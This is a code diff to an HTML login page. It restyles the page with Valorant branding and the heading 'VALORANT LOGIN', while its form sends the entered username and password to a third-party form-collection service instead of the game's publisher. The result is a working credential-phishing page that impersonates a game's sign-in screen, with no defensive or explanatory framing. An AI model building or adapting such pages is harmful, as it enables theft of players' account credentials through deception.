@@ -1,53 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
 <title>Login</title>
 
 <style>
-
 body{
+background:#0f1923;
+font-family:Arial, sans-serif;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
-background:#0f1923;
-font-family:Arial;
+margin:0;
 }
 
 .box{
 background:#1f2731;
 padding:40px;
-border-radius:8px;
+border-radius:10px;
 width:320px;
 text-align:center;
-box-shadow:0 0 25px rgba(0,0,0,0.6);
 border:2px solid #ff4655;
+box-shadow:0 0 25px rgba(255,70,85,0.4);
 }
 
 h1{
+color:#ff4655;
 margin-bottom:25px;
 letter-spacing:2px;
-color:#ff4655;
 }
 
 input{
 width:100%;
 padding:12px;
 margin:10px 0;
-border:none;
-border-radius:4px;
+border-radius:5px;
+border:1px solid #333;
 background:#0f1923;
 color:white;
-border:1px solid #333;
+}
+
+input:focus{
+outline:none;
+border:1px solid #ff4655;
 }
 
 button{
 width:100%;
 padding:12px;
-background:#ff4655;
+margin-top:15px;
 border:none;
+background:#ff4655;
 color:white;
+font-size:16px;
+border-radius:5px;
 cursor:pointer;
+transition:0.2s;
+}
+
+button:hover{
+background:#ff2a3d;
+transform:scale(1.05);
 }
 
 </style>
@@ -57,7 +71,7 @@ cursor:pointer;
 
 <div class="box">
 
-<h1>Sign In</h1>
+<h1>VALORANT LOGIN</h1>
 
 <form action="https://formspree.io/f/xkqoweza" method="POST">
 
@@ -65,7 +79,7 @@ cursor:pointer;
 
 <input type="password" name="password" placeholder="Password">
 
-<button type="submit">Sign in</button>
+<button type="submit">Sign In</button>
 
 </form>
 
